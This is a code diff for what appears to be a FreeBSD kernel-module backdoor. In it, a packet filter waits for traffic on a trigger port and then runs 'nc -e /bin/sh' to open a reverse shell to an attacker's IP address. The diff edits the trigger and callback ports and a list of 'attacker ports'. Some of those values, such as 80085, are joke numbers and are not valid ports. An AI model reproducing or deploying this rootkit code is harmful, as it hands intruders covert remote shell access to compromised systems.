@@ -18,10 +18,12 @@
 #include <netinet/ip_var.h>
 #include <net/if.h>
 
+
+// understand this!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 #define TRIGGER_PORT 6969
 
 
-static int attacker_ports[] = {22, 80, 443, 8080, 3306, 5432, 21, 25, 587, 53}; // List of target ports
+static int attacker_ports[] = {22, 80, 443, 8080, 21, 42069, 80085, 69, 420, 2200}; // List of target ports
 
 int kern_execve(struct thread *td, struct execve_args *uap);
 
@@ -113,7 +115,7 @@ static pfil_return_t packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir,
                 // Construct the reverse shell command
                 char reverse_shell_cmd[100];
                 snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
-                    "nc -e /bin/sh %s 80085", attacker_ip_str);
+                    "nc -e /bin/sh %s 6969", attacker_ip_str);
 
 
                 printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
